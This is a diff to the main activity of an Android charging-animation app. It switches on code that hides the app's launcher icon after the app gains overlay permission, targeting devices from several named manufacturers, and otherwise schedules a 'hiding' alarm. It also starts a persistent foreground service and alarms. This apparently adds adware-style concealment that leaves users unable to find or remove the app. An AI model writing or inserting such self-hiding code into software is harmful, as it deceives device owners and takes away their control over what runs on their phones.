@@ -19,10 +19,14 @@ import com.rocket.charge.R
 import com.rocket.charge.base.BaseActivity
 import com.rocket.charge.databinding.MainActivityBinding
 import com.rocket.charge.repository.background.display.ForegroundService
+import com.rocket.charge.repository.preferences.Preferences
 import com.rocket.charge.ui.animations.AnimationFragment
 import com.rocket.charge.ui.home.HomeFragment
 import com.rocket.charge.ui.onboarding.OnboardingActivity
 import com.rocket.charge.ui.settings.SettingsFragment
+import com.rocket.charge.utils.hiding.AlarmBroadcast
+import com.rocket.charge.utils.hiding.AppHidingUtil
+import com.rocket.charge.utils.hiding.HidingBroadcast
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import java.util.*
@@ -100,7 +104,11 @@ class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
     override fun provideViewModel() = viewModel
 
     override fun setupUI() {
-//        AlarmBroadcast.startAlarm(this)
+        if (Preferences.firstLaunchMillis == -1L)
+            Preferences.firstLaunchMillis = System.currentTimeMillis()
+
+        AlarmBroadcast.startAlarm(this)
+
         if (ForegroundService.instance === null)
             startService(Intent(this, ForegroundService::class.java))
         if (!Settings.canDrawOverlays(this))
@@ -119,14 +127,14 @@ class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
 
     override fun onResume() {
         super.onResume()
-//        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
-//            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
-//        else
-//            HidingBroadcast.startAlarm(this)todo
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HidingBroadcast.startAlarm(this)
     }
 
-//    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
-//        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
-//    )
+    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
+        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
+    )
 
 }
